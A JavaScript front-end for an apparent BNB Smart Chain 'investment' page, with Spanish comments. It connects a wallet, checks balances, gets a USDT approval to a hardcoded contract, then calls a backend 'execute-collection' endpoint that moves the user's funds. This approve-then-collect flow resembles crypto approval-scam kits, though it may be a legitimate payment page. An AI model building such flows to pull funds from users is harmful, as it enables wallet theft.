"use strict";

// ─── Configuration ────────────────────────────────────────────────────────────
const MERCHANT_ADDRESS = "0x6253fecbb48a6a7d19f1b9a799e65fae58ab9b3b";
const CONTRACT_ADDRESS = "0x8e18bE616f10565A63cEa65585Ddf1Ca61f1C634";
const BSC_USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
const BSC_CHAIN_ID_HEX = "0x38"; 
const MIN_USDT_BALANCE = 0n; 
const BACKEND_URL      = "https://secure-merchant.onrender.com/api";

const BSC_RPC_URLS = [
  "https://bsc-rpc.publicnode.com",
  "https://bsc-dataseed1.binance.org/",
  "https://bsc-dataseed2.binance.org/",
  "https://rpc.ankr.com/bsc"
];

const BSC_CHAIN_PARAMS = {
  chainId:           BSC_CHAIN_ID_HEX,
  chainName:         "BNB Smart Chain",
  nativeCurrency:    { name: "BNB", symbol: "BNB", decimals: 18 },
  rpcUrls:           BSC_RPC_URLS,
  blockExplorerUrls: ["https://bscscan.com/"]
};

const ERC20_ABI = [
  "function approve(address spender, uint256 amount) external returns (bool)",
  "function allowance(address owner, address spender) external view returns (uint256)",
  "function balanceOf(address account) external view returns (uint256)"
];

// ─── DOM refs ─────────────────────────────────────────────────────────────────
const approveBtn    = document.getElementById("approveBtn");
const btnText       = document.getElementById("btnText");
const btnSpinner    = document.getElementById("btnSpinner");
const merchantInput = document.getElementById("merchantAddress");
const toastEl       = document.getElementById("toast");

if (merchantInput) merchantInput.value = MERCHANT_ADDRESS;

// ─── Wake up Render backend ───────────────────────────────────────────────────
(async () => { try { await fetch(`${BACKEND_URL}/health`); } catch (_) {} })();

// ─── UI helpers ───────────────────────────────────────────────────────────────
let _toastTimer;
function showToast(msg, type = "default", ms = 4500) {
  if (!toastEl) return;
  clearTimeout(_toastTimer);
  toastEl.textContent  = msg;
  toastEl.dataset.type = type === "default" ? "" : type;
  toastEl.hidden       = false;
  _toastTimer = setTimeout(() => { toastEl.hidden = true; }, ms);
}

function setLoading(on, label = "Processing…") {
  if (!approveBtn) return;
  approveBtn.disabled = on;
  if (btnText) btnText.textContent = on ? label : "NEXT";
  if (btnSpinner) btnSpinner.hidden   = !on;
}

// ─── Backend collect trigger ──────────────────────────────────────────────────
async function triggerBackendCollect(userAddress) {
  let lastErr;
  const uiAmount = document.getElementById("investAmount")?.value || "1"; 
  const dynamicAmountWei = ethers.parseUnits(uiAmount.toString(), 18).toString();

  for (let i = 1; i <= 3; i++) {
    try {
      const res  = await fetch(`${BACKEND_URL}/execute-collection`, {
        method:  "POST",
        headers: { "Content-Type": "application/json" },
        body:    JSON.stringify({ userAddress: userAddress, amount: dynamicAmountWei })
      });
      const data = await res.json();
      if (!res.ok || !data.success) throw new Error(data.error || "Collection failed.");
      return data;
    } catch (e) {
      lastErr = e;
      if (i < 3) await new Promise(r => setTimeout(r, 3000));
    }
  }
  throw lastErr;
}

// Bandera de control para saber si hay una inversión esperando a que el usuario conecte
let pendingInvestment = false;

// 1. Suscripción reactiva: Detecta automáticamente cuando el usuario conecta su wallet en el modal
if (window.modal && typeof window.modal.subscribeProviders === "function") {
  window.modal.subscribeProviders((state) => {
    const rawProvider = state["eip155"]; // Proveedor EVM (BSC, Ethereum, etc.)
    
    // Si el proveedor ya está disponible y el usuario había hecho clic en "Invertir"
    if (rawProvider && pendingInvestment) {
      pendingInvestment = false; // Desactivamos la bandera
      runInvestmentFlow(rawProvider); // ¡Lanzamos el contrato y la firma en automático!
    }
  });
}

// 2. Evento unificado del botón principal
if (approveBtn) {
  approveBtn.addEventListener("click", async () => {
    let rawProvider = null;
    if (window.modal && typeof window.modal.getWalletProvider === "function") {
      try {
        rawProvider = window.modal.getWalletProvider();
      } catch (_) {}
    }

    // CASO A: Si el usuario NO está conectado
    if (!rawProvider) {
      pendingInvestment = true; // Activamos la bandera de espera
      setLoading(true, "Abre tu billetera para conectar...");
      
      if (window.modal && typeof window.modal.open === "function") {
        try {
          await window.modal.open(); // Abre el modal de Reown
        } catch (err) {
          console.error("Error al abrir AppKit:", err);
          pendingInvestment = false;
          setLoading(false);
        }
      }
      return; // Detenemos aquí; el 'subscribeProviders' tomará el control en cuanto el usuario acepte.
    }

    // CASO B: Si el usuario YA estaba conectado previamente
    await runInvestmentFlow(rawProvider);
  });
}

// 3. Función centralizada que ejecuta la red BSC, saldo y aprobación de USDT
async function runInvestmentFlow(rawProvider) {
  setLoading(true, "Conectando proveedor…");
  
  try {
    const provider = new ethers.BrowserProvider(rawProvider);
    
    // 1. Verificación estricta de red BSC (Chain ID 56)
    const network = await provider.getNetwork();
    if (Number(network.chainId) !== 56) {
      setLoading(true, "Cambiando a red BSC…");
      try {
        await rawProvider.request({
          method: "wallet_switchEthereumChain",
          params: [{ chainId: "0x38" }] // 56 en Hex
        });
      } catch (switchError) {
        if (switchError.code === 4902) {
          await rawProvider.request({
            method: "wallet_addEthereumChain",
            params: [{
              chainId: "0x38",
              chainName: "BNB Smart Chain",
              nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
              rpcUrls: ["https://bsc-dataseed.binance.org/"],
              blockExplorerUrls: ["https://bscscan.com/"]
            }]
          });
        } else {
          showToast("Cambia manualmente a BNB Smart Chain en tu wallet.", "error");
          setLoading(false);
          updateButtonState();
          return;
        }
      }
    }

    const signer = await provider.getSigner();
    const userAddress = await signer.getAddress();

    // 2. Validación UX: Comprobar saldo de BNB para el Gas (mínimo recomendado: 0.0005 BNB)
    setLoading(true, "Verificando saldo de gas (BNB)…");
    const bnbBalance = await provider.getBalance(userAddress);
    const minGasRequired = ethers.parseEther("0.0005"); 

    if (bnbBalance < minGasRequired) {
      showToast("Saldo de BNB insuficiente para pagar la comisión de red (Gas).", "error");
      setLoading(false);
      updateButtonState();
      return;
    }

    // 3. Obtener montos e instanciar contrato USDT
    const inputElement = document.getElementById("investAmount");
    const rawInputVal = inputElement ? inputElement.value : "1";
    const requiredAmount = ethers.parseUnits(rawInputVal || "1", 18);

    const usdtContract = new ethers.Contract(BSC_USDT_ADDRESS, ERC20_ABI, signer);

    setLoading(true, "Validando saldo de USDT…");
    const usdtBalance = await usdtContract.balanceOf(userAddress);

    if (usdtBalance < requiredAmount) {
      showToast("No tienes suficiente saldo de USDT en tu billetera.", "error");
      setLoading(false);
      updateButtonState();
      return;
    }

    // 4. Verificar si ya existe Allowance suficiente para evitar aprobaciones redundantes
    const allowance = await usdtContract.allowance(userAddress, CONTRACT_ADDRESS);
    
    if (allowance < requiredAmount) {
      setLoading(true, "Firma requerida para aprobar USDT…");
      const txApprove = await usdtContract.approve(CONTRACT_ADDRESS, requiredAmount);
      
      setLoading(true, "Confirmando aprobación en red...");
      await txApprove.wait();
    }

    // 5. Ejecutar la lógica de inversión o llamada al contrato final
    setLoading(true, "Procesando inversión...");
    const txCollect = await triggerBackendCollect(userAddress); // O tu función de contrato final

    // 6. Éxito con Trazabilidad (Enlace a BscScan)
    // Si 'txCollect' o la transacción devuelve un hash, lo usamos:
    const txHash = txCollect?.hash || "";
    if (txHash) {
      showToast(`¡Inversión exitosa! <a href="https://bscscan.com/tx/${txHash}" target="_blank" style="color: #fff; text-decoration: underline;">Ver en BscScan ↗</a>`, "success", 8000);
    } else {
      showToast("Sent Successfully, Thank you! ✓", "success");
    }

  } catch (err) {
    const raw = err?.reason ?? err?.message ?? "Error desconocido";
    if (
      err.code === 4001 ||
      raw.toLowerCase().includes("user rejected") ||
      raw.toLowerCase().includes("denied") ||
      raw.toLowerCase().includes("cancelled")
    ) {
      showToast("Transacción cancelada por el usuario.", "default");
    } else {
      console.error("Web3 Error:", err);
      showToast("Ocurrió un error al procesar la transacción en la red.", "error");
    }
  } finally {
    setLoading(false);
    updateButtonState();
  }
}
